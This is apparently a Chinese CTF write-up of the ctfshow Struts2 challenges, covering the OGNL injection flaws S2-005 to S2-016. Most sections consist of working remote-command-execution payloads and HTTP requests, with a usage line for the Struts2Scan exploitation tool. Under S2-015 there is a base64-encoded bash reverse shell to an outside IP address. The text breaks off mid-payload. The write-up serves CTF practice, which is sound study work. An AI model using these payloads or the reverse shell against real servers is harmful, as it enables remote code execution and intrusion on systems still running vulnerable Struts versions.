<p>在低于Struts 2.0.12中struts2会将http的每个参数名解析为OGNL语句执行，我们都知道访问Ognl的上下文对象必须要使用<code>#</code>符号，S2-003对<code>#</code>号进行过滤，但是没有考虑到unicode编码情况，导致<code>\u0023</code>或者8进制<code>\43</code>绕过。</p>
<p>对于S2-003漏洞，官方通过增加安全配置（默认禁止了静态方法的调用（<code>allowStaticMethodAcces</code>和<code>MethodAccessor.denyMethodExecution</code>））来修补，但攻击者可以利用OGNL表达式将这2个选项打开，从而再次造成漏洞也就是S2-005。</p>
<h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><h2 id="2-0-0-2-1-8-1"><a href="#2-0-0-2-1-8-1" class="headerlink" title="2.0.0 - 2.1.8.1"></a>2.0.0 - 2.1.8.1</h2><p>poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /example/HelloWorld.action HTTP/<span class="number">1.1</span></span><br><span class="line">Accept: application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; MAXTHON 2.0)</span></span><br><span class="line"><span class="comment">Host: target:8080</span></span><br><span class="line"><span class="comment">Content-Length: 626</span></span><br><span class="line"><span class="comment">redirect:$&#123;%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()&#125;</span></span><br></pre></td></tr></table></figure>

<p>将需要执行的命令进行urlencode编码</p>
<p>当然也可以直接用工具一把梭 <a target="_blank" rel="noopener" href="https://github.com/Vancomycin-g/Struts2Scan">https://github.com/Vancomycin-g/Struts2Scan</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查询漏洞</span></span><br><span class="line">python .\Struts2Scan.py -u &#123;url&#125;</span><br><span class="line"><span class="comment">// 利用漏洞</span></span><br><span class="line">python .\Struts2Scan.py -u &#123;url&#125; -n S2-<span class="number">005</span> --exec</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/java--ctfshow/image-20260218124932855.png" alt="image-20260218124932855"></p>
<p><img src="/../image/achieve/202411/java--ctfshow/image-20260218125026643.png" alt="image-20260218125026643"></p>
<p>直接打就行</p>
<h1 id="web281"><a href="#web281" class="headerlink" title="web281"></a>web281</h1><h2 id="S2-007"><a href="#S2-007" class="headerlink" title="#S2-007"></a>#S2-007</h2><p>可以看y4tacker师傅的</p>
<p> <a target="_blank" rel="noopener" href="https://github.com/Y4tacker/JavaSec/blob/main/7.Struts2%E4%B8%93%E5%8C%BA/S2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.md">https://github.com/Y4tacker/JavaSec/blob/main/7.Struts2%E4%B8%93%E5%8C%BA/S2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.md</a></p>
<p>或者看这位大师傅的分析文章 <a target="_blank" rel="noopener" href="https://github.com/kingkaki/Struts2-Vulenv?tab=readme-ov-file">https://github.com/kingkaki/Struts2-Vulenv?tab=readme-ov-file</a></p>
<p>漏洞原理：</p>
<p>当配置了验证规则<code>-validation.xml</code> 时，验证规则匹配到参数类型错误后，会跳转到配置的错误页面，并对jsp页面上的标签进行解析。后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。 </p>
<h2 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h2><h2 id="2-0-0-2-2-3"><a href="#2-0-0-2-2-3" class="headerlink" title="2.0.0 - 2.2.3"></a>2.0.0 - 2.2.3</h2><p>在登录界面用户名和邮箱值随意，age部分改为我们的payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="number">1</span>&amp;email=<span class="number">1</span>&amp;age=%<span class="number">27</span>+%2B+%<span class="number">28</span>%23_memberAccess%5B%22allowStaticMethodAccess%<span class="number">22</span>%<span class="number">5D</span>%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%<span class="number">28</span>%22false%<span class="number">22</span>%<span class="number">29</span>+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%<span class="number">22</span>%<span class="number">5D</span>%<span class="number">3D</span>%23foo%2C%40org.apache.commons.io.IOUtils%40toString%<span class="number">28</span>%40java.lang.Runtime%40getRuntime%<span class="number">28</span>%<span class="number">29.</span>exec%<span class="number">28</span>%27whoami%<span class="number">27</span>%<span class="number">29.</span>getInputStream%<span class="number">28</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">29</span>+%2B+%<span class="number">27</span></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/java--ctfshow/image-20260218130413169.png" alt="image-20260218130413169"></p>
<p>然后也是直接打就行了</p>
<p><img src="/../image/achieve/202411/java--ctfshow/image-20260218130144363.png" alt="image-20260218130144363"></p>
<h1 id="web282"><a href="#web282" class="headerlink" title="web282"></a>web282</h1><h2 id="S2-008"><a href="#S2-008" class="headerlink" title="#S2-008"></a>#S2-008</h2><p><a target="_blank" rel="noopener" href="https://github.com/Y4tacker/JavaSec/blob/main/7.Struts2%E4%B8%93%E5%8C%BA/S2-008%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.md">https://github.com/Y4tacker/JavaSec/blob/main/7.Struts2%E4%B8%93%E5%8C%BA/S2-008%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.md</a></p>
<p>S2-008涉及到很多个漏洞点，常见的一个是Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是这个不太好利用，毕竟例如Tomcat对 Cookie 名称都有字符限制，一些关键字符无法使用，另一个是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，但其实在真实环境中几乎不可能存在，除非开发是9块9包邮的</p>
<h2 id="影响版本-3"><a href="#影响版本-3" class="headerlink" title="影响版本"></a>影响版本</h2><h2 id="2-1-0-2-3-1"><a href="#2-1-0-2-3-1" class="headerlink" title="2.1.0 - 2.3.1"></a>2.1.0 - 2.3.1</h2><p>但是题目的话就给出了第二个漏洞环境，也就是devMode模式下的漏洞</p>
<p>在 devMode 模式下直接添加参数<code>?debug=command&amp;expression=&#123;OGNL 表达式&#125;</code>，会直接执行后面的 OGNL 表达式，因此可以直接执行命令</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">  #_memberAccess.allowStaticMethodAccess=<span class="literal">true</span>,</span><br><span class="line">  #context[<span class="string">&quot;xwork.MethodAccessor.denyMethodExecution&quot;</span>]=<span class="literal">false</span>,</span><br><span class="line">  #cmd=<span class="string">&quot;env&quot;</span>,</span><br><span class="line">  #ret=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(#cmd),</span><br><span class="line">  #data=<span class="keyword">new</span> <span class="title class_">java</span>.io.DataInputStream(#ret.getInputStream()),</span><br><span class="line">  #res=<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2000</span>],</span><br><span class="line">  #data.readFully(#res),</span><br><span class="line">  #echo=<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#res),</span><br><span class="line">  #out=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse()</span>,</span><br><span class="line">  #out.getWriter().println(#echo)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">  #_memberAccess[<span class="string">&quot;allowStaticMethodAccess&quot;</span>]=<span class="literal">true</span>,</span><br><span class="line">  #foo=<span class="keyword">new</span> <span class="title class_">java</span>.lang.Boolean(<span class="string">&quot;false&quot;</span>),</span><br><span class="line">  #context[<span class="string">&quot;xwork.MethodAccessor.denyMethodExecution&quot;</span>]=#foo,</span><br><span class="line">  <span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(</span></span><br><span class="line"><span class="meta">    @java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream()</span></span><br><span class="line"><span class="meta">  )</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>但是第一个payload有readFully方法的一个特性，就是必须读取<strong>完整的</strong> 数组长度，如果流中数据不足 2000 字节，会 <strong>一直阻塞等待</strong>，第二个payload又需要有依赖Apache Commons IO，两个poc都不是很广泛</p>
<p>让ai换了一个poc，将readFully换成了read</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">  #_memberAccess.allowStaticMethodAccess=<span class="literal">true</span>,</span><br><span class="line">  #context[<span class="string">&quot;xwork.MethodAccessor.denyMethodExecution&quot;</span>]=<span class="literal">false</span>,</span><br><span class="line">  #cmd=<span class="string">&quot;env&quot;</span>,</span><br><span class="line">  #ret=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(#cmd),</span><br><span class="line">  #data=<span class="keyword">new</span> <span class="title class_">java</span>.io.DataInputStream(#ret.getInputStream()),</span><br><span class="line">  #res=<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2000</span>],</span><br><span class="line">  #len=#data.read(#res),  </span><br><span class="line">  #echo=<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#res, <span class="number">0</span>, #len),  </span><br><span class="line">  #out=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse()</span>,</span><br><span class="line">  #out.getWriter().println(#echo)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/java--ctfshow/image-20260218132339513.png" alt="image-20260218132339513"></p>
<h1 id="web283"><a href="#web283" class="headerlink" title="web283"></a>web283</h1><h2 id="S2-009"><a href="#S2-009" class="headerlink" title="#S2-009"></a>#S2-009</h2><p>参考文章：<a target="_blank" rel="noopener" href="https://windeskybb.work/archives/d8a48e1e-90d3-4de4-8143-8cdfa1aecb79">https://windeskybb.work/archives/d8a48e1e-90d3-4de4-8143-8cdfa1aecb79</a></p>
<p>S2-009是S2-003与S2-005的补丁绕过，由于 Struts 2 会将 HTTP 请求的每个参数名解析为OGNL表达式执行，S2-003 与 S2-005 修复后 Struts 对参数名的过滤更加严格，只允许使用字母、数字以及部分特殊字符，而特殊字符只能为<code>’ ( ) [ ]</code>，即单引号、小括号、中括号。</p>
<p><strong>S2-009 则是将 OGNL 表达式先放进 action 接收的参数中，然后再使用特殊方法取出存放的参数值，参数值 Strust 2 是未做严格校验的。</strong></p>
<h2 id="影响版本-4"><a href="#影响版本-4" class="headerlink" title="影响版本"></a>影响版本</h2><h2 id="2-1-0-2-3-1-1"><a href="#2-1-0-2-3-1-1" class="headerlink" title="2.1.0 - 2.3.1.1"></a>2.1.0 - 2.3.1.1</h2><p>访问<code>/S2-009/</code>路径后是<strong>Apache Struts 2 框架</strong>的ShowCase</p>
<p>我们需要找到一个接受参数且参数类型是 String 的 action，可以用&#x2F;S2-009&#x2F;example5.action</p>
<p><img src="/../image/achieve/202411/java--ctfshow/image-20260219192614313.png" alt="image-20260219192614313"></p>
<p><img src="/../image/achieve/202411/java--ctfshow/image-20260219192655753.png" alt="image-20260219192655753"></p>
<p>这个页面接受name和age两个参数，其中 name 参数为 String类型。源代码分析的话就直接看文章里面吧</p>
<p>poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">age=<span class="number">12</span>&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%<span class="number">22</span>]=+<span class="keyword">new</span>+java.lang.Boolean(<span class="literal">false</span>),+%23_memberAccess[%22allowStaticMethodAccess%<span class="number">22</span>]=<span class="literal">true</span>,+%23a=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(%27env%<span class="number">27</span>).getInputStream(),%23b=<span class="keyword">new</span>+java.io.InputStreamReader(%23a),%23c=<span class="keyword">new</span>+java.io.BufferedReader(%23b),%<span class="number">23d</span>=<span class="keyword">new</span>+<span class="type">char</span>[<span class="number">51020</span>],%23c.read(%<span class="number">23d</span>),%23kxlzx=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse()</span>.getWriter(),%23kxlzx.println(%<span class="number">23d</span>),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%<span class="number">27</span>)]</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/java--ctfshow/image-20260219193304057.png" alt="image-20260219193304057"></p>
<p>然后直接打就行了</p>
<h1 id="web284"><a href="#web284" class="headerlink" title="web284"></a>web284</h1><h2 id="S2-012"><a href="#S2-012" class="headerlink" title="#S2-012"></a>#S2-012</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/sycamorelg/article/details/118335710">https://blog.csdn.net/sycamorelg/article/details/118335710</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2197848">https://cloud.tencent.com/developer/article/2197848</a></p>
<p>S2-012中，包含特制请求参数的请求可用于将任意 OGNL 代码注入属性，然后用作重定向地址的请求参数，这将导致进一步评估。当重定向结果从堆栈中读取并使用先前注入的代码作为重定向参数时，将进行第二次评估。这使恶意用户可以将任意 OGNL 语句放入由操作公开的任何未过滤的 String 变量中，并将其评估为 OGNL 表达式，以启用方法执行并执行任意方法，从而绕过 Struts 和 OGNL 库保护。</p>
<h2 id="影响版本-5"><a href="#影响版本-5" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.1.0-2.3.13</p>
<p>在题目环境中找到一个提交表单</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/S2-012/user.action&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">&quot;wwFormTable&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">&quot;tdLabel&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;user_name&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">id</span>=<span class="string">&quot;user_0&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>存在一个路径为<code>/S2-012/user.action</code>的POST请求表单，那我们直接传吧</p>
<p>poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#cmd=<span class="string">&#x27;whoami&#x27;</span>).(#cmds=(#iswin?&#123;<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(#cmds)).redirectErrorStream(<span class="literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close())&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/java--ctfshow/image-20260223223713004.png" alt="image-20260223223713004"></p>
<h1 id="web285"><a href="#web285" class="headerlink" title="web285"></a>web285</h1><h2 id="S2-013"><a href="#S2-013" class="headerlink" title="#S2-013"></a>#S2-013</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_47493074/article/details/126931475">https://blog.csdn.net/weixin_47493074/article/details/126931475</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2197849">https://cloud.tencent.com/developer/article/2197849</a></p>
<p>struts2的标签中<code>&lt;s:a&gt;</code>和<code>&lt;s:url&gt;</code>都提供includeparams属性。该属性的主要作用域是了解包含或不包含<code>http://request</code>参数的内容。INCLUDEParams的允许值为：</p>
<ul>
<li>none-在URL中不包含任何参数（默认）</li>
<li>get-仅在URL中包含get参数</li>
<li>all-在URL中同时包含get和post参数。</li>
</ul>
<p>当includeParams&#x3D;all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上，此时<code>&lt;s:a&gt;</code> 或<code>&lt;s:url&gt;</code>尝试去解析原始请求参数时，会导致OGNL表达式的执行</p>
<h2 id="影响版本-6"><a href="#影响版本-6" class="headerlink" title="影响版本"></a>影响版本</h2><p>2.0.0 - 2.3.14.1</p>
<p>POC</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=$&#123;#_memberAccess[<span class="string">&quot;allowStaticMethodAccess&quot;</span>]=<span class="literal">true</span>,#a=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(<span class="string">&#x27;whoami&#x27;</span>).getInputStream(),#b=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#a),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#b),#d=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#c.read(#d),#out=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse()</span>.getWriter(),#out.println(<span class="string">&#x27;dbapp=&#x27;</span>+<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#d)),#out.close()&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/java--ctfshow/image-20260223224536076.png" alt="image-20260223224536076"></p>
<h1 id="web286"><a href="#web286" class="headerlink" title="web286"></a>web286</h1><h2 id="S2-015"><a href="#S2-015" class="headerlink" title="#S2-015"></a>#S2-015</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/crayonxiaoxin/p/17025707.html">https://www.cnblogs.com/crayonxiaoxin/p/17025707.html</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2097445">https://cloud.tencent.com/developer/article/2097445</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-015/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/struts2/s2-015/README.zh-cn.md</a></p>
<p>漏洞产生于配置了 Action 通配符 <code>*</code>，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式。</p>
<p>一旦配置通配符<code>*</code>，访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。但是由于 name 值的位置比较特殊，一些特殊的字符如 <code>/ &quot; \ </code>都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功。</p>
<h2 id="影响版本-7"><a href="#影响版本-7" class="headerlink" title="影响版本"></a>影响版本</h2><p>2.0.0至2.3.14.2</p>
<p>poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/$&#123;#context[‘xwork.MethodAccessor.denyMethodExecution’]=<span class="literal">false</span>,#m=#_memberAccess.getClass().getDeclaredField(‘allowStaticMethodAccess’),#m.setAccessible(<span class="literal">true</span>),#m.set(#_memberAccess,<span class="literal">true</span>),#q=<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(‘whoami’).getInputStream())</span>,#q&#125;.action</span><br><span class="line">    </span><br><span class="line">$&#123;#context[<span class="string">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span>]=<span class="literal">false</span>,#m=#_memberAccess.getClass().getDeclaredField(<span class="string">&#x27;allowStaticMethodAccess&#x27;</span>),#m.setAccessible(<span class="literal">true</span>),#m.set(#_memberAccess,<span class="literal">true</span>),#q=<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())</span>,#q&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/java--ctfshow/image-20260224111235115.png" alt="image-20260224111235115"></p>
<p>可以看到回显了root，成功执行命令whoami</p>
<p>但是直接env的回显内容是有限的，弹个shell吧</p>
<p><img src="/../image/achieve/202411/java--ctfshow/image-20260224112106048.png" alt="image-20260224112106048"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%<span class="number">24</span>%7B%23context%5B<span class="string">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span>%<span class="number">5D</span>%3Dfalse%2C%23m%<span class="number">3D</span>%23_memberAccess.getClass().getDeclaredField(<span class="string">&#x27;allowStaticMethodAccess&#x27;</span>)%2C%23m.setAccessible(<span class="literal">true</span>)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%<span class="number">3D</span>%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(<span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIzLjI1LjE4Ni85OTk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span>).getInputStream())%2C%23q%<span class="number">7D</span>.action</span><br></pre></td></tr></table></figure>

<h1 id="web287"><a href="#web287" class="headerlink" title="web287"></a>web287</h1><h2 id="S2-016"><a href="#S2-016" class="headerlink" title="#S2-016"></a>#S2-016</h2><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-016/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/struts2/s2-016/README.zh-cn.md</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2197854">https://cloud.tencent.com/developer/article/2197854</a></p>
<p>在Struts 2框架中，DefaultActionMapper类支持以<code>“action:”、“redirect:”、“redirectAction:”</code>作为导航或重定向前缀，这些导航或者前缀后面可以写OGNL表达式。Struts 2并没有对这些前缀进行过滤，所以可以任意执行恶意OGNL表达式以执行系统命令。DefaultActionMapper类支持<code>“method:”、“action:”、“redirect:”、“redirectAction:”</code>这些方法 。</p>
<p>所以，访问例如<code>http://your-ip:8080/index.action?redirect:OGNL表达式</code>即可执行OGNL表达式。</p>
<h2 id="影响版本-8"><a href="#影响版本-8" class="headerlink" title="影响版本"></a>影响版本</h2><p>2.0.0 - 2.3.15</p>
<p>执行命令：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:$&#123;<span class="selector-id">#context</span><span class="selector-attr">[<span class="string">&quot;xwork.MethodAccessor.denyMethodExecution&quot;</span>]</span>=false,#f=#_memberAccess<span class="selector-class">.getClass</span>()<span class="selector-class">.getDeclaredField</span>(<span class="string">&quot;allowStaticMethodAccess&quot;</span>),<span class="selector-id">#f</span><span class="selector-class">.setAccessible</span>(true),<span class="selector-id">#f</span><span class="selector-class">.set</span>(#_memberAccess,true),#a=@java<span class="selector-class">.lang</span>.Runtime@<span class="built_in">getRuntime</span>()<span class="selector-class">.exec</span>(<span class="string">&quot;uname -a&quot;</span>)<span class="selector-class">.getInputStream</span>(),#b=new java<span class="selector-class">.io</span><span class="selector-class">.InputStreamReader</span>(#a),#c=new java<span class="selector-class">.io</span><span class="selector-class">.BufferedReader</span>(#b),#d=new char<span class="selector-attr">[5000]</span>,<span class="selector-id">#c</span><span class="selector-class">.read</span>(#d),#genxor=<span class="selector-id">#context</span><span class="selector-class">.get</span>(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>)<span class="selector-class">.getWriter</span>(),<span class="selector-id">#genxor</span><span class="selector-class">.println</span>(#d),<span class="selector-id">#genxor</span><span class="selector-class">.flush</span>(),<span class="selector-id">#genxor</span><span class="selector-class">.close</span>()&#125;</span><br></pre></td></tr></table></figure>

<p>获取web目录：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:$&#123;#req=<span class="selector-id">#context</span><span class="selector-class">.get</span>(<span class="string">&#x27;co&#x27;</span>+<span class="string">&#x27;m.open&#x27;</span>+<span class="string">&#x27;symphony.xwo&#x27;</span>+<span class="string">&#x27;rk2.disp&#x27;</span>+<span class="string">&#x27;atcher.HttpSer&#x27;</span>+<span class="string">&#x27;vletReq&#x27;</span>+<span class="string">&#x27;uest&#x27;</span>),#resp=<span class="selector-id">#context</span><span class="selector-class">.get</span>(<span class="string">&#x27;co&#x27;</span>+<span class="string">&#x27;m.open&#x27;</span>+<span class="string">&#x27;symphony.xwo&#x27;</span>+<span class="string">&#x27;rk2.disp&#x27;</span>+<span class="string">&#x27;atcher.HttpSer&#x27;</span>+<span class="string">&#x27;vletRes&#x27;</span>+<span class="string">&#x27;ponse&#x27;</span>),<span class="selector-id">#resp</span><span class="selector-class">.setCharacterEncoding</span>(<span class="string">&#x27;UTF-8&#x27;</span>),#ot=<span class="selector-id">#resp</span><span class="selector-class">.getWriter</span> (),<span class="selector-id">#ot</span><span class="selector-class">.print</span>(<span class="string">&#x27;web&#x27;</span>),<span class="selector-id">#ot</span><span class="selector-class">.print</span>(<span class="string">&#x27;path:&#x27;</span>),<span class="selector-id">#ot</span><span class="selector-class">.print</span>(<span class="selector-id">#req</span><span class="selector-class">.getSession</span>()<span class="selector-class">.getServletContext</span>()<span class="selector-class">.getRealPath</span>(<span class="string">&#x27;/&#x27;</span>)),<span class="selector-id">#ot</span><span 